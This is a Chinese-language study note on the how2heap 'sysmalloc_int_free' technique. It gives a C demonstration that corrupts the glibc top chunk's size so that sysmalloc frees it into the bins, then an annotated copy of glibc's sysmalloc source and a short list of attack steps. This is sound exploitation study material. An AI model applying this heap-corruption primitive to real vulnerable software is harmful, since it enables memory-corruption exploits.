# 源码
```
#define _GNU_SOURCE

#include <stdio.h>
#include <string.h>
#include <assert.h>
#include <malloc.h>
#include <unistd.h>

#define SIZE_SZ sizeof(size_t)

#define CHUNK_HDR_SZ (SIZE_SZ*2)
// same for x86_64 and x86
#define MALLOC_ALIGN 0x10
#define MALLOC_MASK (-MALLOC_ALIGN)

#define PAGESIZE sysconf(_SC_PAGESIZE)
#define PAGE_MASK (PAGESIZE-1)

// fencepost are offsets removed from the top before freeing
#define FENCEPOST (2*CHUNK_HDR_SZ)

#define PROBE (0x20-CHUNK_HDR_SZ)

// target top chunk size that should be freed
#define CHUNK_FREED_SIZE 0x150
#define FREED_SIZE (CHUNK_FREED_SIZE-CHUNK_HDR_SZ)

/**
 * Tested on:
 *  + GLIBC 2.39 (x86_64, x86 & aarch64)
 *  + GLIBC 2.34 (x86_64, x86 & aarch64)
 *  + GLIBC 2.31 (x86_64, x86 & aarch64)
 *  + GLIBC 2.27 (x86_64, x86 & aarch64)
 *
 * sysmalloc allows us to free() the top chunk of heap to create nearly arbitrary bins,
 * which can be used to corrupt heap without needing to call free() directly.
 * This is achieved through sysmalloc calling _int_free to the top_chunk (wilderness),
 * if the top_chunk can't be merged during heap growth
 * https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2913
 *
 * This technique is used in House of Orange & Tangerine
 */
int main() {
  size_t allocated_size, *top_size_ptr, top_size, new_top_size, freed_top_size, *new, *old;
  // disable buffering
  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stdin, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);

  // check if all chunks sizes are aligned
  assert((CHUNK_FREED_SIZE & MALLOC_MASK) == CHUNK_FREED_SIZE);

  puts("Constants:");
  printf("chunk header \t\t= 0x%lx\n", CHUNK_HDR_SZ);
  printf("malloc align \t\t= 0x%lx\n", MALLOC_ALIGN);
  printf("page align \t\t= 0x%lx\n", PAGESIZE);
  printf("fencepost size \t\t= 0x%lx\n", FENCEPOST);
  printf("freed size \t\t= 0x%lx\n", FREED_SIZE);

  printf("target top chunk size \t= 0x%lx\n", CHUNK_HDR_SZ + MALLOC_ALIGN + CHUNK_FREED_SIZE);

  // probe the current size of the top_chunk,
  // can be skipped if it is already known or predictable
  new = malloc(PROBE);
  top_size = new[(PROBE / SIZE_SZ) + 1];
  printf("first top size \t\t= 0x%lx\n", top_size);

  // calculate allocated_size
  allocated_size = top_size - CHUNK_HDR_SZ - (2 * MALLOC_ALIGN) - CHUNK_FREED_SIZE;
  allocated_size &= PAGE_MASK;
  allocated_size &= MALLOC_MASK;

  printf("allocated size \t\t= 0x%lx\n\n", allocated_size);

  puts("1. create initial malloc that will be used to corrupt the top_chunk (wilderness)");
  new = malloc(allocated_size);

  // use BOF or OOB to corrupt the top_chunk
  top_size_ptr = &new[(allocated_size / SIZE_SZ)-1 + (MALLOC_ALIGN / SIZE_SZ)];

  top_size = *top_size_ptr;

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- initial malloc\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|      SIZE (0x%05lx)   |\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of current heap page\n\n",
         new - 2,
         top_size_ptr - 1,
         top_size - 1,
         top_size_ptr - 1 + (top_size / SIZE_SZ));

  puts("2. corrupt the size of top chunk to be less, but still page aligned");

  // make sure corrupt top size is page aligned, generally 0x1000
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2599
  new_top_size = top_size & PAGE_MASK;
  *top_size_ptr = new_top_size;
  printf(""
         "----- %-14p ----\n"
         "|          NEW          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |   <- positive OOB (i.e. BOF)\n"
         "----- %-14p ----\n"
         "|         TOP           |   <- corrupt size of top chunk (wilderness)\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----   <- still page aligned\n"
         "|         ...           |\n"
         "----- %-14p ----   <- end of current heap page\n\n",
         new - 2,
         top_size_ptr - 1,
         new_top_size - 1,
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         top_size_ptr - 1 + (top_size / SIZE_SZ));


  puts("3. create an allocation larger than the remaining top chunk, to trigger heap growth");
  puts("The now corrupt top_chunk triggers sysmalloc to call _init_free on it");

  // remove fencepost from top_chunk, to get size that will be freed
  // https://elixir.bootlin.com/glibc/glibc-2.39/source/malloc/malloc.c#L2895
  freed_top_size = (new_top_size - FENCEPOST) & MALLOC_MASK;
  assert(freed_top_size == CHUNK_FREED_SIZE);

  old = new;
  new = malloc(CHUNK_FREED_SIZE + 0x10);

  printf(""
         "----- %-14p ----\n"
         "|          OLD          |\n"
         "| AAAAAAAAAAAAAAAAAAAAA |\n"
         "----- %-14p ----\n"
         "|         FREED         |   <- old top got freed because it couldn't be merged\n"
         "|     SIZE (0x%05lx)    |\n"
         "----- %-14p ----\n"
         "|       FENCEPOST       |   <- just some architecture depending padding\n"
         "----- %-14p ----   <- still page aligned\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of previous heap page\n"
         "|          NEW          |   <- new malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- end of current heap page\n\n",
         old - 2,
         top_size_ptr - 1,
         freed_top_size,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE/SIZE_SZ),
         top_size_ptr - 1 + (new_top_size / SIZE_SZ),
         new - (MALLOC_ALIGN / SIZE_SZ));

  puts("...\n");

  puts("?. reallocated into the freed chunk");

  old = new;
  new = malloc(FREED_SIZE);

  assert((size_t) old > (size_t) new);

  printf(""
         "----- %-14p ----\n"
         "|          NEW          |   <- allocated into the freed chunk\n"
         "|                       |\n"
         "----- %-14p ----\n"
         "|          ...          |\n"
         "----- %-14p ----   <- end of previous heap page\n"
         "|          OLD          |   <- old malloc\n"
         "-------------------------\n"
         "|          TOP          |   <- top chunk (wilderness)\n"
         "|          ...          |\n"
         "-------------------------   <- end of current heap page\n",
         new - 2,
         top_size_ptr - 1 + (CHUNK_FREED_SIZE / SIZE_SZ),
         old - (MALLOC_ALIGN / SIZE_SZ));
}
```
这个样例通过`malloc()`中的`sysmalloc()`调用`int_free()`，将任意大小的chunk free进bins中，再没有直接的`free()函数`调用的情况下非常关键。
# sysmalloc源码分析
```
static void *
sysmalloc (INTERNAL_SIZE_T nb, mstate av)
{
  mchunkptr old_top;              /* incoming value of av->top */
  INTERNAL_SIZE_T old_size;       /* its size */
  char *old_end;                  /* its end address */

  long size;                      /* arg to first MORECORE or mmap call */
  char *brk;                      /* return value from MORECORE */

  long correction;                /* arg to 2nd MORECORE call */
  char *snd_brk;                  /* 2nd return val */

  INTERNAL_SIZE_T front_misalign; /* unusable bytes at front of new space */
  INTERNAL_SIZE_T end_misalign;   /* partial page left at end of new space */
  char *aligned_brk;              /* aligned offset into brk */

  mchunkptr p;                    /* the allocated/returned chunk */
  mchunkptr remainder;            /* remainder from allocation */
  unsigned long remainder_size;   /* its size */


  size_t pagesize = GLRO (dl_pagesize);
  bool tried_mmap = false;


  /*
     If have mmap, and the request size meets the mmap threshold, and
     the system supports mmap, and there are few enough currently
     allocated mmapped regions, try to directly map this request
     rather than expanding top.
   */

  if (av == NULL
      || ((unsigned long) (nb) >= (unsigned long) (mp_.mmap_threshold)
	  && (mp_.n_mmaps < mp_.n_mmaps_max)))
    {
      char *mm;
#if HAVE_TUNABLES
      if (mp_.hp_pagesize > 0 && nb >= mp_.hp_pagesize)
	{
	  /* There is no need to isse the THP madvise call if Huge Pages are
	     used directly.  */
	  mm = sysmalloc_mmap (nb, mp_.hp_pagesize, mp_.hp_flags, av);
	  if (mm != MAP_FAILED)
	    return mm;
	}
#endif
      mm = sysmalloc_mmap (nb, pagesize, 0, av);
      if (mm != MAP_FAILED)
	return mm;
      tried_mmap = true;
    }

  /* There are no usable arenas and mmap also failed.  */
  if (av == NULL)
    return 0;

  /* Record incoming configuration of top */

  old_top = av->top;
  old_size = chunksize (old_top);
  old_end = (char *) (chunk_at_offset (old_top, old_size));

  brk = snd_brk = (char *) (MORECORE_FAILURE);

  /*
     If not the first time through, we require old_size to be
     at least MINSIZE and to have prev_inuse set.
   */

  assert ((old_top == initial_top (av) && old_size == 0) ||
          ((unsigned long) (old_size) >= MINSIZE &&
           prev_inuse (old_top) &&
           ((unsigned long) old_end & (pagesize - 1)) == 0));

  /* Precondition: not enough current space to satisfy nb request */
  assert ((unsigned long) (old_size) < (unsigned long) (nb + MINSIZE));


  if (av != &main_arena)
    {
      heap_info *old_heap, *heap;
      size_t old_heap_size;

      /* First try to extend the current heap. */
      old_heap = heap_for_ptr (old_top);
      old_heap_size = old_heap->size;
      if ((long) (MINSIZE + nb - old_size) > 0
          && grow_heap (old_heap, MINSIZE + nb - old_size) == 0)
        {
          av->system_mem += old_heap->size - old_heap_size;
          set_head (old_top, (((char *) old_heap + old_heap->size) - (char *) old_top)
                    | PREV_INUSE);
        }
      else if ((heap = new_heap (nb + (MINSIZE + sizeof (*heap)), mp_.top_pad)))
        {
          /* Use a newly allocated heap.  */
          heap->ar_ptr = av;
          heap->prev = old_heap;
          av->system_mem += heap->size;
          /* Set up the new top.  */
          top (av) = chunk_at_offset (heap, sizeof (*heap));
          set_head (top (av), (heap->size - sizeof (*heap)) | PREV_INUSE);

          /* Setup fencepost and free the old top chunk with a multiple of
             MALLOC_ALIGNMENT in size. */
          /* The fencepost takes at least MINSIZE bytes, because it might
             become the top chunk again later.  Note that a footer is set
             up, too, although the chunk is marked in use. */
          old_size = (old_size - MINSIZE) & ~MALLOC_ALIGN_MASK;
          set_head (chunk_at_offset (old_top, old_size + CHUNK_HDR_SZ),
		    0 | PREV_INUSE);
          if (old_size >= MINSIZE)
            {
              set_head (chunk_at_offset (old_top, old_size),
			CHUNK_HDR_SZ | PREV_INUSE);
              set_foot (chunk_at_offset (old_top, old_size), CHUNK_HDR_SZ);
              set_head (old_top, old_size | PREV_INUSE | NON_MAIN_ARENA);
              _int_free (av, old_top, 1);
            }
          else
            {
              set_head (old_top, (old_size + CHUNK_HDR_SZ) | PREV_INUSE);
              set_foot (old_top, (old_size + CHUNK_HDR_SZ));
            }
        }
      else if (!tried_mmap)
	{
	  /* We can at least try to use to mmap memory.  If new_heap fails
	     it is unlikely that trying to allocate huge pages will
	     succeed.  */
	  char *mm = sysmalloc_mmap (nb, pagesize, 0, av);
	  if (mm != MAP_FAILED)
	    return mm;
	}
    }
  else     /* av == main_arena */


    { /* Request enough space for nb + pad + overhead */
      size = nb + mp_.top_pad + MINSIZE;

      /*
         If contiguous, we can subtract out existing space that we hope to
         combine with new space. We add it back later only if
         we don't actually get contiguous space.
       */

      if (contiguous (av))
        size -= old_size;

      /*
         Round to a multiple of page size or huge page size.
         If MORECORE is not contiguous, this ensures that we only call it
         with whole-page arguments.  And if MORECORE is contiguous and
         this is not first time through, this preserves page-alignment of
         previous calls. Otherwise, we correct to page-align below.
       */

#if HAVE_TUNABLES && defined (MADV_HUGEPAGE)
      /* Defined in brk.c.  */
      extern void *__curbrk;
      if (__glibc_unlikely (mp_.thp_pagesize != 0))
	{
	  uintptr_t top = ALIGN_UP ((uintptr_t) __curbrk + size,
				    mp_.thp_pagesize);
	  size = top - (uintptr_t) __curbrk;
	}
      else
#endif
	size = ALIGN_UP (size, GLRO(dl_pagesize));

      /*
         Don't try to call MORECORE if argument is so big as to appear
         negative. Note that since mmap takes size_t arg, it may succeed
         below even if we cannot call MORECORE.
       */

      if (size > 0)
        {
          brk = (char *) (MORECORE (size));
	  if (brk != (char *) (MORECORE_FAILURE))
	    madvise_thp (brk, size);
          LIBC_PROBE (memory_sbrk_more, 2, brk, size);
        }

      if (brk == (char *) (MORECORE_FAILURE))
        {
          /*
             If have mmap, try using it as a backup when MORECORE fails or
             cannot be used. This is worth doing on systems that have "holes" in
             address space, so sbrk cannot extend to give contiguous space, but
             space is available elsewhere.  Note that we ignore mmap max count
             and threshold limits, since the space will not be used as a
             segregated mmap region.
           */

	  char *mbrk = MAP_FAILED;
#if HAVE_TUNABLES
	  if (mp_.hp_pagesize > 0)
	    mbrk = sysmalloc_mmap_fallback (&size, nb, old_size,
					    mp_.hp_pagesize, mp_.hp_pagesize,
					    mp_.hp_flags, av);
#endif
	  if (mbrk == MAP_FAILED)
	    mbrk = sysmalloc_mmap_fallback (&size, nb, old_size, pagesize,
					    MMAP_AS_MORECORE_SIZE, 0, av);
	  if (mbrk != MAP_FAILED)
	    {
	      /* We do not need, and cannot use, another sbrk call to find end */
	      brk = mbrk;
	      snd_brk = brk + size;
	    }
        }

      if (brk != (char *) (MORECORE_FAILURE))
        {
          if (mp_.sbrk_base == 0)
            mp_.sbrk_base = brk;
          av->system_mem += size;

          /*
             If MORECORE extends previous space, we can likewise extend top size.
           */

          if (brk == old_end && snd_brk == (char *) (MORECORE_FAILURE))
            set_head (old_top, (size + old_size) | PREV_INUSE);

          else if (contiguous (av) && old_size && brk < old_end)
	    /* Oops!  Someone else killed our space..  Can't touch anything.  */
	    malloc_printerr ("break adjusted to free malloc space");

          /*
             Otherwise, make adjustments:

           * If the first time through or noncontiguous, we need to call sbrk
              just to find out where the end of memory lies.

           * We need to ensure that all returned chunks from malloc will meet
              MALLOC_ALIGNMENT

           * If there was an intervening foreign sbrk, we need to adjust sbrk
              request size to account for fact that we will not be able to
              combine new space with existing space in old_top.

           * Almost all systems internally allocate whole pages at a time, in
              which case we might as well use the whole last page of request.
              So we allocate enough more memory to hit a page boundary now,
              which in turn causes future contiguous calls to page-align.
           */

          else
            {
              front_misalign = 0;
              end_misalign = 0;
              correction = 0;
              aligned_brk = brk;

              /* handle contiguous cases */
              if (contiguous (av))
                {
                  /* Count foreign sbrk as system_mem.  */
                  if (old_size)
                    av->system_mem += brk - old_end;

                  /* Guarantee alignment of first new chunk made from this space */

                  front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) & MALLOC_ALIGN_MASK;
                  if (front_misalign > 0)
                    {
                      /*
                         Skip over some bytes to arrive at an aligned position.
                         We don't need to specially mark these wasted front bytes.
                         They will never be accessed anyway because
                         prev_inuse of av->top (and any chunk created from its start)
                         is always true after initialization.
                       */

                      correction = MALLOC_ALIGNMENT - front_misalign;
                      aligned_brk += correction;
                    }

                  /*
                     If this isn't adjacent to existing space, then we will not
                     be able to merge with old_top space, so must add to 2nd request.
                   */

                  correction += old_size;

                  /* Extend the end address to hit a page boundary */
                  end_misalign = (INTERNAL_SIZE_T) (brk + size + correction);
                  correction += (ALIGN_UP (end_misalign, pagesize)) - end_misalign;

                  assert (correction >= 0);
                  snd_brk = (char *) (MORECORE (correction));

                  /*
                     If can't allocate correction, try to at least find out current
                     brk.  It might be enough to proceed without failing.

                     Note that if second sbrk did NOT fail, we assume that space
                     is contiguous with first sbrk. This is a safe assumption unless
                     program is multithreaded but doesn't use locks and a foreign sbrk
                     occurred between our first and second calls.
                   */

                  if (snd_brk == (char *) (MORECORE_FAILURE))
                    {
                      correction = 0;
                      snd_brk = (char *) (MORECORE (0));
                    }
		  else
		    madvise_thp (snd_brk, correction);
                }

              /* handle non-contiguous cases */
              else
                {
                  if (MALLOC_ALIGNMENT == CHUNK_HDR_SZ)
                    /* MORECORE/mmap must correctly align */
                    assert (((unsigned long) chunk2mem (brk) & MALLOC_ALIGN_MASK) == 0);
                  else
                    {
                      front_misalign = (INTERNAL_SIZE_T) chunk2mem (brk) & MALLOC_ALIGN_MASK;
                      if (front_misalign > 0)
                        {
                          /*
                             Skip over some bytes to arrive at an aligned position.
                             We don't need to specially mark these wasted front bytes.
                             They will never be accessed anyway because
                             prev_inuse of av->top (and any chunk created from its start)
                             is always true after initialization.
                           */

                          aligned_brk += MALLOC_ALIGNMENT - front_misalign;
                        }
                    }

                  /* Find out current end of memory */
                  if (snd_brk == (char *) (MORECORE_FAILURE))
                    {
                      snd_brk = (char *) (MORECORE (0));
                    }
                }

              /* Adjust top based on results of second sbrk */
              if (snd_brk != (char *) (MORECORE_FAILURE))
                {
                  av->top = (mchunkptr) aligned_brk;
                  set_head (av->top, (snd_brk - aligned_brk + correction) | PREV_INUSE);
                  av->system_mem += correction;

                  /*
                     If not the first time through, we either have a
                     gap due to foreign sbrk or a non-contiguous region.  Insert a
                     double fencepost at old_top to prevent consolidation with space
                     we don't own. These fenceposts are artificial chunks that are
                     marked as inuse and are in any case too small to use.  We need
                     two to make sizes and alignments work out.
                   */

                  if (old_size != 0)
                    {
                      /*
                         Shrink old_top to insert fenceposts, keeping size a
                         multiple of MALLOC_ALIGNMENT. We know there is at least
                         enough space in old_top to do this.
                       */
                      old_size = (old_size - 2 * CHUNK_HDR_SZ) & ~MALLOC_ALIGN_MASK;
                      set_head (old_top, old_size | PREV_INUSE);

                      /*
                         Note that the following assignments completely overwrite
                         old_top when old_size was previously MINSIZE.  This is
                         intentional. We need the fencepost, even if old_top otherwise gets
                         lost.
                       */
		      set_head (chunk_at_offset (old_top, old_size),
				CHUNK_HDR_SZ | PREV_INUSE);
		      set_head (chunk_at_offset (old_top,
						 old_size + CHUNK_HDR_SZ),
				CHUNK_HDR_SZ | PREV_INUSE);

                      /* If possible, release the rest. */
                      if (old_size >= MINSIZE)
                        {
                          _int_free (av, old_top, 1);
                        }
                    }
                }
            }
        }
    } /* if (av !=  &main_arena) */

  if ((unsigned long) av->system_mem > (unsigned long) (av->max_system_mem))
    av->max_system_mem = av->system_mem;
  check_malloc_state (av);

  /* finally, do the allocation */
  p = av->top;
  size = chunksize (p);

  /* check that one of the above allocation paths succeeded */
  if ((unsigned long) (size) >= (unsigned long) (nb + MINSIZE))
    {
      remainder_size = size - nb;
      remainder = chunk_at_offset (p, nb);
      av->top = remainder;
      set_head (p, nb | PREV_INUSE | (av != &main_arena ? NON_MAIN_ARENA : 0));
      set_head (remainder, remainder_size | PREV_INUSE);
      check_malloced_chunk (av, p, nb);
      return chunk2mem (p);
    }

  /* catch all failure paths */
  __set_errno (ENOMEM);
  return 0;
}
```
[[notes/pwn/堆利用/how2heap源码分析/2.35/sysmalloc_int_free/源码分析]]
# 攻击流程
1. 能申请任意大小（或任意次数），或能修改top chunk 的size大小；需要进行free才能进行下一步攻击。
2. 使top chunk size为`需要free的chunk的大小+0x20`，若要修改top chunk size，则需要使整个伪造的heap区0x1000对齐（page aligned）
3. `malloc(top chunk size-0x10)`即可将对应大小chunk free进相应的bins中。

[[notes/pwn/堆利用/how2heap源码分析/2.35/sysmalloc_int_free/总结]]
结束后，堆区结构如下，该利用本质不需要任何漏洞，只是对sysmalloc函数的利用，只是题目常常很难将top chunk size变成需要大小。

free chunk下的是用于fencepost隔离的chunk，具体机制可看上面源码，在调用`int_free()`之后。
![[notes/pwn/堆利用/how2heap源码分析/2.35/sysmalloc_int_free/图/屏幕截图 2026-02-10 195157.png]]